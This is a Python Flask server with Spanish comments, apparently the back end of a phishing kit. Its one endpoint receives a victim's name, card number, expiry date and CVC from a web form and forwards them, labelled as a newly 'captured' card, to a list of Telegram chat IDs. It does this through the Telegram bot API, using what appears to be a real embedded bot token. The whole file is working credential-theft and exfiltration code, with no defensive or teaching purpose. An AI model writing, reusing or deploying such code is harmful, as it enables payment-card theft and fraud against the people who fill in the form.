import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- LISTA MAESTRA (Asegúrate de que todos tengan comillas) ---
LISTA_MAESTRA_IDS = [
    '6953415010', 
    '7707049896', 
    '-1087968824', 
    '1087968824', 
    '123456789', 
    '987654321'
]

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    # Obtenemos la lista de IDs que manda el HTML
    lista_ids_html = data.get('lista_ids', [])
    
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    # Convertimos la lista maestra a una lista de STRINGS para asegurar la comparación
    lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]

    for id_receptor in lista_ids_html:
        # Convertimos el ID que viene del HTML a STRING y le quitamos espacios
        id_a_validar = str(id_receptor).strip()

        # VALIDACIÓN DE FUERZA BRUTA: Comparamos texto contra texto
        if id_a_validar in lista_maestra_strings:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": id_a_validar, "text": mensaje, "parse_mode": "Markdown"}
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
                    print(f"✅ Enviado con éxito al ID: {id_a_validar}")
                else:
                    print(f"❌ Error de Telegram para {id_a_validar}: {res.text}")
            except Exception as e:
                print(f"❌ Error de red con {id_a_validar}: {e}")
        else:
            print(f"🚫 ID RECHAZADO (No está en la lista maestra): {id_a_validar}")

    print(f"🏁 Proceso terminado. Enviados: {exitos}")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
